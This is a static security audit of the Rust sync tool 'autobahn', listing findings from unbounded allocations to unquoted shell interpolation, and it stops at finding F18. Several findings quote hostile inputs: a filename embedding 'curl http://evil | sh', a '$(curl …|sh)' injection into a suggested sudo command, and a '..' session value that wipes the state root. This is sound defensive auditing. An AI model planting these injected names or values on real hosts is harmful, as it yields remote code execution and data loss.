# Autobahn — Security Report

**Auditor:** static review of the working tree (no dynamic/fuzzing campaign)
**Repository:** `fny/autobahn` (`origin git@github.com:fny/autobahn.git`)
**Revision reviewed:** commit `1180499` plus the uncommitted working-tree changes
(`git status` shows ~40 staged/unstaged files, including `.github/workflows/*`,
`README.md`, `bench/*`, `docs/*`; deleted `TODO-SPEED.md`, `spec/*.tla` variants,
`docs/reviews/*`). Findings were derived from the files as they exist on disk, not
from `HEAD`.
**Date:** 2026-09-23
**Scope:** all of `src/` (~42,000 LOC Rust), `scripts/`, `.github/workflows/`,
`Cargo.toml`/`Cargo.lock`, `docs/` where it states a security guarantee.

---

## 1. How to read this

### Severity scale

| Level | Meaning here |
|---|---|
| **CRITICAL** | Remote/unauthorized code execution or full secret compromise with no user interaction. |
| **HIGH** | Code execution or data destruction crossing a trust boundary, or a break of the tool's central "writes stay inside the root" guarantee. |
| **MEDIUM** | Meaningful confidentiality/integrity/availability loss under a realistic precondition (multi-user host, compromised peer, permissive umask, user follows the tool's own advice). |
| **LOW** | Hardening gap, defense-in-depth failure, or a bug with limited preconditions. |
| **INFO** | By-design behavior worth recording, or a verified control. |

### Threat model assumed

1. **The local user's own machine (single-user).** An attacker who already runs
   arbitrary code as the same user is out of scope — `~/.autobahn` and the user's
   SSH agent are already theirs.
2. **A second local user on a shared host.** In scope; several findings live here.
3. **The remote beta host.** SSH-authenticated, so "trusted", but the agent binary
   and filesystem on that host are assumed *possibly* hostile (semi-trusted). The
   tool's design already refuses to act on impossible paths from a peer; failures to
   do so are reported.
4. **A peering leader** — a beta that has taken the lead. It is a *remote* peer that
   becomes the controller of the alpha's session. This is the weakest trust
   relationship in the product, and several findings are only reachable through it.
5. **Supply chain** — the GitHub release of `fny/autobahn`.

The stated boundary in the code and docs is: *"paths come from a controller, which
is trusted"*. This report takes that as given for the direct SSH topology, and
specifically reports the places where the peering topology makes that assumption
false, and where the local endpoint is nonetheless reachable by something other
than the trusted controller.

---

## 2. Executive summary

Autobahn's core synchronization path is unusually well defended for a
vibe-coded project: framing caps are enforced *before* allocation, path traversal is
blocked component-by-component, symlinks are never traversed during applies, mode
bits are masked to `0o777`, and the protocol handshake pins an exact version plus a
compatibility epoch. Those controls were verified, not assumed (§5).

The findings cluster in four places:

1. **Values from a peer that reach a filesystem path or a shell without validation**
   (F1, F2, F4, F10). The single most serious is F2: a peering leader controls the
   `Initialize` frame, whose unvalidated `session` field is joined into a path and
   passed to `remove_dir_all`.
2. **The tool's own remediation advice is a shell-injection vector** (F3): blocked-path
   names, which a peer can choose, are interpolated unquoted into a `sudo chown`
   command that the TUI puts on the clipboard.
3. **Release and installer integrity** (F7, F8): the agent bundle is installed
   without any checksum in `install.sh`, and every checksum comes from the same
   unsigned source as the artifact it verifies.
4. **Local IPC surfaces** (F5, F6): the peering attach socket has no peer-credential
   check, and the control socket's `/tmp` fallback directory can be pre-created by
   another user.

| ID | Severity | Finding | Location |
|---|---|---|---|
| F1 | **HIGH** | Agent-supplied `ScanDelta.length` drives an unbounded `Vec::with_capacity` on the controller | `src/endpoint/remote.rs:219` |
| F2 | **HIGH** | Peering leader-supplied `Initialize.session` / `root` / `side` are unvalidated; `session` reaches `remove_dir_all` | `src/transport/mod.rs:885`, `src/endpoint/local.rs:2747` |
| F3 | **HIGH** (paste-gated) | Blocked-path prefixes interpolated unquoted into a `sudo chown` clipboard command | `src/main.rs:1592-1616` → `src/shop.rs:452` |
| F4 | MEDIUM | Remote-supplied filenames interpolated unquoted into a remote `rm -f` script | `src/transport/install.rs:299-318` |
| F5 | MEDIUM | Peering attach socket: no peer-credential check, no explicit `0600`, greeting-only auth | `src/supervisor/peer.rs:127-131, 206-226` |
| F6 | MEDIUM | Control-socket `/tmp` fallback directory can be pre-created/spoofed by another user | `src/supervisor/control.rs:238-269` |
| F7 | MEDIUM | `install.sh` never verifies the agent bundle; falls back to installing unverified | `scripts/install.sh:135-168` |
| F8 | MEDIUM | Artifact integrity not authenticated (no signature) and `tar` extraction is unchecked | `src/update.rs:29-33, 106-131, 336-339` |
| F9 | MEDIUM | Shipped example `on_alert` hook interpolates `$AUTOBAHN_SUMMARY` unescaped into `osascript -e` | `src/config.rs:162-163` |
| F10 | MEDIUM | `inside-root` staging directory can be a peer-planted symlink; staged content is written through it | `src/endpoint/local.rs:1107-1111, 954-957, 2747`; `src/scan/mod.rs:173` |
| F11 | LOW | systemd user unit built by string concatenation with no escaping | `src/service.rs:427-446` |
| F12 | LOW | 4 GiB reassembled-message cap → per-channel memory-exhaustion DoS | `src/transport/mod.rs:1017, 1183-1189` |
| F13 | LOW | `bincode` decodes use no explicit `with_limit` | `src/transport/mod.rs:413-415, 1163-1166`; `src/endpoint/remote.rs:241` |
| F14 | LOW | Executability-only `chmod` follows a symlink swapped after validation (TOCTOU) | `src/endpoint/local.rs:2585-2607` |
| F15 | LOW | `rename`/`read_file` resolve parents without the per-component real-directory walk | `src/endpoint/local.rs:1334-1372, 2861-2872` |
| F16 | LOW | Predictable temp/intermediate names (pid-based) in shared directories | `src/persist.rs:227`; `src/main.rs:2064`; `scripts/install.sh:152-155` |
| F17 | LOW | `config.toml` and the state root are created with the default umask | `src/main.rs:2674-2677`; `src/paths.rs:54-58`; `src/main.rs:2663` |
| F18 | LOW | Session lock is advisory `flock` in a umask-dependent directory; status files world-readable | `src/session/mod.rs:1213-1252` |
| F19 | LOW | Relayed agent stderr is printed verbatim → forged/ANSI log lines | `src/transport/mod.rs:130-146` |
| F20 | LOW | Tray diff writes a predictable filename; notifier is resolved from `PATH` | `src/tray.rs:733, 838-862` |
| F21 | LOW | `--version` tag passed into `gh` argv with no `--` separator | `src/update.rs:641-649` |
| F22 | LOW | CI/release actions pinned to mutable tags | `.github/workflows/ci.yml`, `release.yml` |
| F23 | LOW | `Response::Scan` snapshots are not structurally validated (the delta path is) | `src/endpoint/remote.rs:136-139` |
| F24 | LOW | One thread + endpoint per `MuxRequest::Open`, uncapped | `src/transport/mod.rs:438-458` |
| I1 | INFO | `SymlinkMode::Raw` is the default: peer-chosen targets may escape the root | `src/scan/mod.rs:163-174` |
| I2 | INFO | Pushed peering configuration carries `agent_command`, executed on followers | `src/peering.rs:533-536` |
| I3 | INFO | `on_alert` is an arbitrary shell command by design; it inherits the caller's environment | `src/alerts.rs:486-500` |

---

## 3. Findings

### F1 — Agent-supplied `ScanDelta.length` drives an unbounded allocation on the controller

- **Severity: HIGH** (availability; cross-session on one connection)
- **Location:** `src/endpoint/remote.rs:219` (header defined at `src/protocol.rs:76-90`)

**Evidence.** When a scan is answered as a delta, the controller pre-allocates the
reassembly buffer from a length the *agent* chose, before a single byte of content
has arrived:

```rust
// src/endpoint/remote.rs
let mut output = Vec::with_capacity(header.length as usize);
let mut base = Cursor::new(base);
loop { /* pull ScanOps batches */ }
...
if *blake3::hash(&output).as_bytes() != header.digest { bail!(...) }   // checked afterwards
```

`ScanDelta.length: u64` is not compared against `MAXIMUM_FRAME_SIZE`,
`MAXIMUM_MESSAGE_SIZE`, or anything else. The only bounds are *after* the
allocation (the `output.len() as u64 > header.length` check at :233 and the digest
check at :238).

**Impact.** A malicious or compromised agent answers one scan with
`length = u64::MAX` and a ~20-byte header; the controller attempts an allocation of
~16 EiB, which in Rust is a capacity-overflow panic/abort — the supervisor dies,
taking every session on the connection with it. A smaller-but-still-absurd length
(e.g. `2^40`) turns into an OOM kill or heavy swap. Only the transport is required
to reach this: the peer must pass the handshake, which a compromised host passes by
running its own build.

*(On the supported platforms — linux/darwin on x86-64/aarch64 — `as usize` is lossless;
a 32-bit truncation concern does not apply.)*

**Recommendation.** Validate before allocating: reject
`header.length > protocol::MAXIMUM_MESSAGE_SIZE as u64`, and either cap the
pre-allocation (`Vec::with_capacity(min(length, 8 MiB))`) or grow incrementally as
`ScanOps` batches arrive, letting the existing length check and digest verify the
result.

---

### F2 — Peering leader-supplied `Initialize.session` (and `root`) are unvalidated; `session` reaches `remove_dir_all`

- **Severity: HIGH** (arbitrary path read/write and recursive deletion of the state root)
- **Location:** `src/transport/mod.rs:878-890` (`create_endpoint`), `src/endpoint/local.rs:2724-2748` (`staging_root_for`), reachable remotely via `src/transport/mod.rs:920-941` (`attach_as_agent`) and `src/supervisor/peer.rs:290-299`

**Evidence.** The `Initialize` frame carries `root`, `session`, `side`, `ignores`,
modes, and ownership (`src/protocol.rs:34-66`). The agent builds its endpoint
straight from it:

```rust
// src/transport/mod.rs:878-890
let root = crate::paths::expand_tilde(&initialize.root)?;
let staging_area = PathBuf::from(home).join(".autobahn").join("staging");
let _ = std::fs::remove_dir_all(staging_area.join(&initialize.session));   // :885
let state_staging = staging_area.join(format!("{}-{}", initialize.session, initialize.side));
let staging_root = crate::endpoint::local::staging_root_for(
    initialize.staging, &root, state_staging, &initialize.session, &initialize.side)?;
```

and elsewhere the same two strings become directory names:

```rust
// src/endpoint/local.rs:2732-2747
let name = || format!("{TEMPORARY_PREFIX}-staging-{session}-{side}");
...
StagingMode::InsideRoot => Ok(root.join(name())),
```

A repo-wide search finds **no validation of `session`, `side`, or `root` anywhere.**
Every other path in the system is checked (`validate_path`/`validate_name` at
`src/endpoint/local.rs:3039-3062`, `resolve_relative` at :2861); these are the
exception.

In the ordinary topology the controller is the local user's own process, so this is
self-inflicted. **In peering attach mode it is not.** The alpha spawns
`ssh <leader> autobahn peering attach` and then runs `serve_agent` over that
connection (`src/transport/mod.rs:920-941`, `src/supervisor/peer.rs:290-299`), so the
**remote leader sends the `Initialize`** and drives the alpha's local endpoint.

**Impact.**

- `session = ".."` → `staging_area.join("..")` is `~/.autobahn`, and
  `remove_dir_all` deletes the entire state root: `config.toml`, every session's
  ancestor/journal (the entire reconciliation baseline), `status/`, the installed
  `agents/` bundle, and `peering/`. `session = "../../.."` reaches the home
  directory. This happens on channel open, before any synchronization request is
  made.
- `side`/`session` also name the staging directory (F10's mechanism).
- `root` is taken verbatim (after `~` expansion) and becomes the endpoint's
  confinement boundary. In attach mode the leader therefore decides *which local
  directory on the alpha* the session reads, writes, and deletes. `resolve_relative`
  confines writes to whatever root the leader named — which is no confinement at all
  if the leader names `/` or `$HOME`.

**Recommendation.**
1. Validate `session` and `side` as plain single names (the existing `validate_name`
   rules: non-empty, no `.`/`..`, no separators, no NUL) in `create_endpoint`,
   *before* they are joined or passed to `remove_dir_all`. Remove the
   `remove_dir_all(staging_area.join(&session))` line, or perform it only on a
   validated name.
2. In attach mode, pin `Initialize.root` to the alpha's own configured root for that
   session (the alpha knows it from its configuration) and refuse a mismatch, rather
   than trusting the leader's value.
3. Consider applying the same validation to `ignores`, `default_owner`,
   `default_group` (currently bounded only by later resolution/`IgnoreSet` compile).

---

### F3 — Blocked-path prefixes are interpolated unquoted into the `sudo chown` command the TUI copies to the clipboard

- **Severity: HIGH** (paste-gated; root command execution)
- **Location:** `src/main.rs:1592-1616` (`blocked_fix`), consumed at `src/shop.rs:448-459` (`copy_fix`)

**Evidence.** When a path is blocked by a permission error, autobahn composes the
remediation command the user is meant to run:

```rust
// src/main.rs:1602-1616
if cause.contains("Permission denied") {
    match side {
        "beta" => {
            match spec.split_once(':') {
                Some((destination, root)) => {
                    let user = destination.split('@').next().unwrap_or(destination);
                    fixes.push(format!(
                        "ssh {destination} 'sudo chown -R {user} {root}/{where_}'"));
                }
                None => fixes.push(format!("sudo chown -R \"$(whoami)\" {spec}/{where_}")),
            }
        }
        _ => fixes.push(format!(
            "sudo chown -R \"$(whoami)\" {}/{where_}", plan.alpha_spec)),
    }
```

`where_` is the shared path prefix of the blocked paths, built from on-disk names
(and `""` becomes `.`). Nothing quotes it, validates it, or restricts its character
set. The TUI then puts the string on the clipboard:

```rust
// src/shop.rs:452
let told = match copy_to_clipboard(&fixes.join("\n")) { ... };
```

**Impact.** Path names in a synchronized tree are chosen by the *other side*. A
malicious or compromised beta creates a file or directory whose name contains shell
metacharacters — `;`, backticks, `$(...)`, `|`, newline — and the next permission
block on that prefix produces a suggested fix containing it. The local variant
(`sudo chown -R "$(whoami)" /sync/$(curl …|sh)`) is *executed by the user as root*
when pasted. The remote variant is inside single quotes locally but the remote shell
receives it unquoted, so the injected command runs on the beta as the SSH user.

This is the tool's own recommended action, so the user's incentive is to paste it.
The only gate is the manual paste.

**Recommendation.** Quote every interpolated component for the shell that will
consume it (`shell_escape` each of `where_`, `root`, `spec`, `destination`, `user`),
and reject or elide prefixes containing anything outside a conservative name set
before building the string. Prefer emitting a command whose arguments are already
quoted by construction, and never interpolate a scan-derived path into a command
string without escaping.

---

### F4 — Remote-supplied filenames interpolated unquoted into a remote `rm -f` script

- **Severity: MEDIUM** (defense-in-depth against a semi-trusted remote host)
- **Location:** `src/transport/install.rs:299-318` (`prune_agents`), script executed via `ssh_command` at :355-369

**Evidence.** `.autobahn/bin` is listed on the remote host, and the names read back
are filtered only by a prefix and the absence of `/`:

```rust
// src/transport/install.rs:296-318
let newest_first: Vec<String> = String::from_utf8_lossy(&output.stdout)
    .lines()
    .map(str::trim)
    .filter(|name| !name.is_empty())
    .filter(|name| name.starts_with("autobahn-") && !name.contains('/'))
    .map(str::to_owned)
    .collect();
...
let names = removed.iter().map(|name| format!("~/.autobahn/bin/{name}")).collect::<Vec<_>>().join(" ");
let script = format!("rm -f {names}");
```

The comment beside this claims removal happens "by exact name under the one
directory, never by pattern: a glob here would be a remote `rm` whose reach depends
on what happens to be on the far side" — but there is no shell quoting and no
metacharacter rejection, so a file named `autobahn-x; curl http://evil | sh` (which
passes the filter) executes during routine pruning.

**Impact.** Arbitrary command execution as the SSH user on the destination host,
triggered by any file an attacker can place in the remote `~/.autobahn/bin`. The
destination is already SSH-trusted, so this is a defense-in-depth failure rather
than a privilege boundary crossing — but it turns a *semi*-trusted or partially
compromised host, or a shared `$HOME`, into silent code execution on the sync path.

**Recommendation.** Allowlist the name character set (a versioned agent name needs
only `[A-Za-z0-9._+-]`), then shell-quote each path even after the allowlist.

---

### F5 — Peering attach socket has no peer-credential check and no explicit mode

- **Severity: MEDIUM**
- **Location:** `src/supervisor/peer.rs:127-131` (bind), `:206-226` (`accept_attachment`)

**Evidence.** The leader binds the socket with no permission hardening:

```rust
// src/supervisor/peer.rs:127-131
let socket = directory.join(peering::ATTACH_SOCKET);   // ~/.autobahn/peering/attach.sock
let _ = std::fs::remove_file(&socket);
let listener = std::os::unix::net::UnixListener::bind(&socket)
    .with_context(|| format!("unable to listen at {}", socket.display()))?;
```

and authenticates the connection with a single greeting line:

```rust
// src/supervisor/peer.rs:218-226
let name = name.trim().to_owned();
if name != peering::ALPHA {
    anyhow::bail!("{name:?} is not a peer that attaches");
}
crate::transport::Connection::from_streams(Box::new(reader), Box::new(stream));
supervisor.offer_attachment(&name, connection);
```

Contrast the control socket, which does this correctly: parent `0700`, socket
`0600`, and `SO_PEERCRED`/`getpeereid` same-uid check before reading a frame
(`src/supervisor/control.rs:262-276, 300-336`).

**Impact.** The socket file's mode is whatever `bind` produces under the current
umask (`0777 & ~umask`). Under a permissive umask (`000`, `002`) or a group-shared
`$HOME`, another local user (or group member) can connect, send `alpha\n`, and
become the *alpha endpoint of a session* — gaining read/write authority over the
leader's synchronized roots and the ability to drive the local endpoint with
`Initialize` (see F2). Even in the world-unwritable case, the asymmetry with the
control socket is a latent hazard: a change of umask silently removes the
protection.

**Recommendation.** `set_permissions(socket, 0o600)` immediately after `bind`, create
the `peering/` directory `0o700`, and apply a `peer_is_same_user` check (share the
implementation with `control.rs`) before accepting an attachment.

---

### F6 — Control-socket `/tmp` fallback directory can be pre-created or spoofed by another user

- **Severity: MEDIUM** (multi-user hosts, long state-root paths only)
- **Location:** `src/supervisor/control.rs:238-269`

**Evidence.** When a state root is too deep for `sockaddr_un`, the socket moves to a
predictable per-uid path in the shared temp directory, and both hardening steps are
best-effort:

```rust
// src/supervisor/control.rs:238-269
let directory = format!("autobahn-{}", unsafe { libc::getuid() });
let fallback = std::env::temp_dir().join(&directory).join(format!("{name}.sock"));
...
std::fs::create_dir_all(parent)...;
let _ = std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o700));  // :266
let _ = std::fs::remove_file(&path);                                                // :268
let listener = UnixListener::bind(&path)...;
```

The directory name is derivable from the uid, and `/tmp` is world-writable with the
sticky bit — which prevents *deleting others' files* but not *creating* `autobahn-<uid>`
first. If another user creates it, `set_permissions(0700)` fails (swallowed) and the
`remove_file`/`bind` fail inside a directory the supervisor does not own; in the
spoofing variant the attacker owns the socket path and receives the CLI's requests.

**Impact.** Control-plane denial of service (no supervisor socket), disclosure of
group/host selector names to the attacker's socket, and the CLI deserializing a
`ControlResponse` from an untrusted peer (bounded by the frame caps, so no
amplification — but the data is attacker-declared). Only reachable when the state
root exceeds ~100 bytes, which is why this is not higher.

**Recommendation.** Treat the fallback directory as untrusted: verify ownership and
mode with `symlink_metadata` and refuse (with a clear error) when it is not the
current user's and `0700`; create it with `O_EXCL` semantics rather than
`create_dir_all`; never swallow the `chmod`/`unlink` failures.

---

### F7 — `install.sh` installs the agent bundle with no checksum, and installs unverified on checksum-download failure

- **Severity: MEDIUM**
- **Location:** `scripts/install.sh:135-168`

**Evidence.** The binary is verified — the bundle, which the controller later
uploads to and executes on every remote host, is not:

```sh
# scripts/install.sh:135-148
if fetch "SHA256SUMS" "$WORK/SHA256SUMS" 2>/dev/null; then
    expected="$(grep " \{1,2\}autobahn-$PLATFORM\$" "$WORK/SHA256SUMS" | cut -d' ' -f1 || true)"
    ...
    [ "$expected" = "$actual" ] || die "checksum mismatch ..."
else
    say "  warning: the release publishes no SHA256SUMS; installing unverified"
fi

# scripts/install.sh:160-168 — no verification at all
if fetch "autobahn-agents.tar.gz" "$WORK/agents.tar.gz" 2>/dev/null; then
    tar xzf "$WORK/agents.tar.gz" -C "$WORK/extract"
    [ -d "$WORK/extract/agents" ] || die "the agent bundle has an unexpected layout"
    mv "$WORK/extract/agents" "$STATE_HOME/agents"
```

`SHA256SUMS` does carry an entry for `autobahn-agents.tar.gz`
(`.github/workflows/release.yml`), and the Rust updater *does* verify it
(`src/update.rs:127-131`) — so `install.sh` is both weaker and inconsistent with
`autobahn update`. The `else` branch also conflates "the release publishes no
checksums" with "the checksum download failed" (network error, proxy, truncation)
and installs anyway; `update` deliberately refuses in that case
(`src/update.rs:106-110`).

**Impact.** Substitution or corruption of the agent bundle is undetected, and the
controller then publishes it as its own agent to every host it bootstraps. An
attacker able to fail *only* the `SHA256SUMS` request downgrades the whole install
to unverified.

**Recommendation.** Verify `autobahn-agents.tar.gz` against its `SHA256SUMS` entry
exactly as the binary is verified; distinguish fetch-failure from asset-absent and
refuse on failure, keeping the absent case an explicit `--insecure` opt-in.

---

### F8 — Release integrity is checksums-from-the-same-source (no signature); extraction is unchecked

- **Severity: MEDIUM** (supply chain)
- **Location:** `src/update.rs:29-33, 106-131, 336-339, 448-451`; `scripts/install.sh:168`, `:135-148`

**Evidence.** `SHA256SUMS` is fetched from the same release as the artifacts it
covers and nothing is signed:

```rust
// src/update.rs
const REPO: &str = "fny/autobahn";
const CHECKSUMS_ASSET: &str = "SHA256SUMS";
...
source.fetch(CHECKSUMS_ASSET, &staged_sums).context(
    "unable to download SHA256SUMS. Nothing is installed unverified: ...")?;
let sums = std::fs::read_to_string(&staged_sums)?;
verify(&staged_binary, &format!("autobahn-{platform}"), &sums)?;
```

The archive is then extracted with no member validation and the result is executed:

```rust
// src/update.rs:336-339
Command::new("tar").arg("xzf").arg(archive).arg("-C").arg(&staging).status()?;
// src/update.rs:448-451  — runs the downloaded binary to read its version
Command::new(binary).arg("--version").output()?;
```

**Impact.** This is an integrity check, not an authenticity check: compromise of the
GitHub repository or account (or a moved tag) replaces binary and checksums
together, yielding code execution on every controller and, through the bundle, every
synchronized host. macOS builds are Developer-ID signed and notarised, but
`update`/`install.sh` never verify that signature — notarisation only helps a
browser download past Gatekeeper (the release workflow says so itself). The
unchecked `tar` is only reachable after that trust is established, so it is a
second-order issue.

**Recommendation.** Sign `SHA256SUMS` from a channel independent of the release
(minisign/cosign, or a key in-tree with the signature fetched separately) and verify
it in both `update` and `install.sh`; additionally verify the Developer ID signature
of macOS artifacts with `codesign --verify`. Extract the bundle with member-name
validation (reject absolute paths, `..`, and symlink-then-write members).

---

### F9 — Shipped example `on_alert` hook interpolates `$AUTOBAHN_SUMMARY` unescaped into `osascript -e`

- **Severity: MEDIUM**
- **Location:** `src/config.rs:162-163` (`ON_ALERT_EXAMPLE`), written executable by `autobahn init` (`src/main.rs:2678-2683, 2808-2834`); value sources `src/supervisor/mod.rs:2157-2184` and `src/supervisor/reload.rs:237-243`

**Evidence.**

```sh
# src/config.rs
exec /usr/bin/osascript \
    -e "display notification \"$AUTOBAHN_SUMMARY\" with title \"autobahn\""
```

The dispatcher is not at fault — values are passed as environment variables, never
into the `sh -c` string (`src/alerts.rs:486-496`). The hook itself re-interpolates
them into an AppleScript string literal with no escaping. `AUTOBAHN_SUMMARY` and
`AUTOBAHN_DETAIL` are built from session status and, for `halted`/`errored`, include
raw error text; the config-refusal path puts the raw TOML parse error into
`AUTOBAHN_DETAIL`. The tray's own `osascript` call *does* escape (`src/tray.rs:786`:
`text.replace('\\', "\\\\").replace('"', "\\\"")`), which is the correct pattern.

**Impact.** A `"` or `\` in an error message closes the AppleScript string and lets
the remainder execute as AppleScript — `do shell script` gives full user-privilege
command execution on the next alert. Reachable from locally produced errors
containing quotes, and plausibly from remote-relayed error text in the
`halted`/`errored` clause. The hook only runs if the user points `on_alert` at it
(the template ships the line commented out), which bounds severity.

**Recommendation.** Escape `"` and `\` in the example hook (or pass the value as
`osascript -e 'on run(argv)' … <value>` argv), mirroring `tray.rs`; and sanitize
(truncate, strip control characters) error text before it enters the alert
environment.

---

### F10 — `inside-root` staging can be a peer-planted symlink; staged content is written through it

- **Severity: MEDIUM** (requires the opt-in `staging = "inside-root"` and a peer that can create symlinks)
- **Location:** `src/endpoint/local.rs:2724-2748` (name), `:1107-1111` (`stage_begin`), `:954-957` (`open_receive_file`); `src/scan/mod.rs:163-174` (`SymlinkMode::Raw` default), `:612-615` (temporaries are scan-invisible)

**Evidence.** The inside-root staging directory has a name derived from the session
and side, i.e. from data the peer controls (F2):

```rust
// src/endpoint/local.rs:2732-2747
let name = || format!("{TEMPORARY_PREFIX}-staging-{session}-{side}");
...
StagingMode::InsideRoot => Ok(root.join(name())),
```

Nothing verifies that this path is a real directory: `create_dir_all` succeeds
through a symlink to a directory,

```rust
// src/endpoint/local.rs:1107-1111
fn stage_begin(&mut self, files: Vec<FileRequest>) -> Result<Vec<StagingNeed>> {
    fs::create_dir_all(&self.staging_root)...
```

and received content is created with a following `File::create`:

```rust
// src/endpoint/local.rs:954-957
let temporary = self.staging_root.join(temporary_name("recv"));
let output = File::create(&temporary)...
```

A peer can plant that name inside the root, because transition nodes carry arbitrary
names (`validate_name` rejects only empty/`.`/`..`/separator/NUL,
`src/endpoint/local.rs:3039-3052`) and the default `SymlinkMode::Raw` creates
targets verbatim with no confinement check (`src/endpoint/local.rs:2081-2084`). The
planted link is then scan-invisible forever (`src/scan/mod.rs:612-615`).

**Impact.** Every staged blob is written to the symlink target — arbitrary file
write outside the synchronization root, as the agent's user — breaking the
confinement that `resolve_parent` establishes for all other writes. Preconditions:
the group opts into `staging = "inside-root"`, and the peer can create a symlink.

**Recommendation.** In `stage_begin`, require `symlink_metadata(staging_root)` to be
a real directory and refuse otherwise (reporting a problem rather than failing
silently); re-verify with an `openat`/`O_NOFOLLOW` walk. Consider refusing
`inside-root` staging when `symlink_mode` permits peer-created symlinks, and
reserving the staging name against peer creation.

---

### F11 — systemd user unit generated by string concatenation with no escaping

- **Severity: LOW** (same-user values only)
- **Location:** `src/service.rs:427-446`

**Evidence.**

```rust
let mut exec = executable.to_string_lossy().into_owned();
for argument in arguments { exec.push(' '); exec.push_str(argument); }
let environment = match home {
    Some(home) => format!("Environment=\"{}={}\"\n", crate::paths::HOME_VARIABLE, home.to_string_lossy()),
    None => String::new(),
};
// ... "ExecStart={exec}\n{environment}..." with StandardOutput=append:{log}
```

`arguments` carries `--config <path>` and `--state-root <path>`; `home` is
`$AUTOBAHN_HOME`. A path with a space silently splits into extra arguments; a path or
`AUTOBAHN_HOME` containing `"` breaks the `Environment=` quoting; a newline injects
unit directives (`ExecStartPost=`, `Environment=`); `%` specifiers are expanded by
systemd. The macOS plist path escapes XML properly
(`src/service.rs:186-190`), so this is an asymmetry rather than an unknown hazard.

**Impact.** Corrupted or injected unit for the same user who can already write
`~/.config/systemd/user/`. No privilege boundary crossed.

**Recommendation.** Quote and escape each `ExecStart` argument per systemd rules
(`"`, `\`, `%`), reject paths containing newlines, and escape `%` in `Environment=`.

---

### F12 — 4 GiB reassembled-message cap enables memory-exhaustion DoS

- **Severity: LOW**
- **Location:** `src/transport/mod.rs:1017` (`MAXIMUM_MESSAGE_SIZE = 4 GiB`), enforced at `:1183-1189`

**Evidence.** A message may be reassembled from any number of 16 MiB frames up to
4 GiB, accumulated in one `Vec` per in-flight message:

```rust
if message.len() + chunk.len() > MAXIMUM_MESSAGE_SIZE { bail!(...) }
message.extend_from_slice(&chunk);
```

**Impact.** A compromised agent can make the controller hold up to 4 GiB per
in-flight message per channel by streaming frames it never completes. Bandwidth-bound
and requires the peer to pass the handshake, but repeatable.

**Recommendation.** Bound by message kind (no request or response legitimately
approaches 4 GiB), and release partial buffers when a channel fails.

---

### F13 — `bincode` decodes use no explicit `with_limit`

- **Severity: LOW** (hardening)
- **Location:** `src/transport/mod.rs:413-415` (agent), `:1163-1166` (controller), `src/endpoint/remote.rs:241` (reassembled snapshot), `src/session/ancestor.rs:647-679` / `:744` (state files)

**Evidence.** Every decode is a bare `bincode::deserialize(&bytes)` with `bincode 1.3.3`
(`Cargo.lock`); no `bincode::options()…with_limit` appears in production code.

**Assessment.** The obvious attack — a short frame declaring a huge `Vec`/`String`
— is *mitigated* rather than open: `bincode::deserialize` on a slice validates
declared lengths against the remaining input (`read_bytes` before
`forward_read_str`/`visit_seq`), and serde caps sequence pre-allocation
(`serde::__private::size_hint::cautious`, `MAX_PREALLOC_BYTES = 1 MiB`). Memory
therefore grows with bytes actually received, not with a declared number. The
absence of an explicit limit remains a hardening gap if either dependency's behavior
changes.

**Recommendation.** Decode with
`bincode::options().with_fixint_encoding().with_limit(n)` (mirroring the encoder) so
the limit is stated in autobahn's own code rather than inherited from a dependency
default.

---

### F14 — Executability-only `chmod` follows a symlink swapped after validation (TOCTOU)

- **Severity: LOW**
- **Location:** `src/endpoint/local.rs:2585-2607` (and `:1975-1976` for the root, `:2222` for staged files)

**Evidence.** The target is validated with `symlink_metadata` (no follow) and then
mode bits are applied with `fs::set_permissions`, which follows a symlink at the
final component:

```rust
let metadata = match fs::symlink_metadata(&target) { ... };
if let Err(message) = self.validate_file(path, &metadata, old_digest) { ... }
...
if old_digest == new_digest {
    let mode = creation_mode(self.file_mode, *executable);
    if let Err(error) = fs::set_permissions(&target, Permissions::from_mode(mode)) { ... }
}
```

`apply_ownership` deliberately uses `lchown` for exactly this reason
(`src/endpoint/local.rs:2333-2341`); the chmod path does not.

**Impact.** A local writer in the sync root can swap the validated file for a symlink
in the window and redirect a mode change — including granting execute bits — onto a
file outside the root. Requires concurrent local write access.

**Recommendation.** `open(O_NOFOLLOW)` + `fchmod`, or re-stat and compare
inode/ctime immediately before the chmod.

---

### F15 — `rename`/`read_file` do not verify parent components are real directories

- **Severity: LOW**
- **Location:** `src/endpoint/local.rs:1334-1345` (`read_file`), `:1346-1372` (`rename`), `:2861-2872` (`resolve_relative`)

**Evidence.** Unlike the transition path's `resolve_parent` (which verifies each
parent component with `symlink_metadata`), these two only reject `..`/absolute
components, then `create_dir_all` + `fs::rename` — both of which follow a symlinked
parent.

**Impact.** With a locally planted symlink in a parent directory and a session-layer
rename at that path, a synchronized file is moved outside the root. [INFERENCE] these
are called from the session layer with paths derived from snapshots, not directly
from peer frames, so exploitation needs local write access plus the right operation.

**Recommendation.** Route both through the same per-component `verify_directory`
walk used by `resolve_parent`.

---

### F16 — Predictable pid-based temp/intermediate names

- **Severity: LOW**
- **Location:** `src/persist.rs:226-233`, `src/main.rs:2064`, `scripts/install.sh:152-155`, `src/update.rs:341, 402-404`, `src/session/ancestor.rs:193-200`, `src/supervisor/{mod,reload,peer}.rs` (same pattern)

**Evidence.**

```rust
let temporary = path.with_extension(format!("tmp.{}", std::process::id()));
std::fs::write(&temporary, data)?;
```

```rust
let scratch = std::env::temp_dir().join(format!("autobahn-diff-{}", std::process::id()));
std::fs::create_dir_all(&scratch)...;
```

**Impact.** On a multi-user host, `run_diff`'s scratch directory in shared `/tmp` can
be pre-created (or symlinked) by another user, redirecting peer-derived diff content
to an attacker-chosen path. The state-root and bin-dir variants only matter when
those directories are writable by someone else.

**Recommendation.** Use randomized names (`mktemp -d`, `tempfile`, or a random
token), and create with `O_EXCL`/`O_NOFOLLOW` where available.

---

### F17 — `config.toml` and the state root are created with the default umask

- **Severity: LOW**
- **Location:** `src/main.rs:2674-2677` (`run_init`), `src/paths.rs:54-58`, `src/main.rs:2663`

**Evidence.** `run_init` writes `.toml.new` and renames; no `set_permissions` is
applied to the config, the state root, `sessions/`, or staging (contrast
`write_example_script`, which does chmod `0o755` at `src/main.rs:2822-2824`).

**Impact.** `config.toml` (hostnames, paths, the `on_alert` command, possibly
`agent_command`) and staged copies of synchronized file content are readable by
other local users on shared hosts. No secrets are stored directly (SSH auth is
delegated to the agent/keys).

**Recommendation.** `0600` for the config and its intermediate, `0700` for the state
root and its session/staging subdirectories.

---

### F18 — Session lock is advisory `flock` in a umask-dependent directory

- **Severity: LOW**
- **Location:** `src/session/mod.rs:1181, 1213-1252`, `src/paths.rs:54-58`

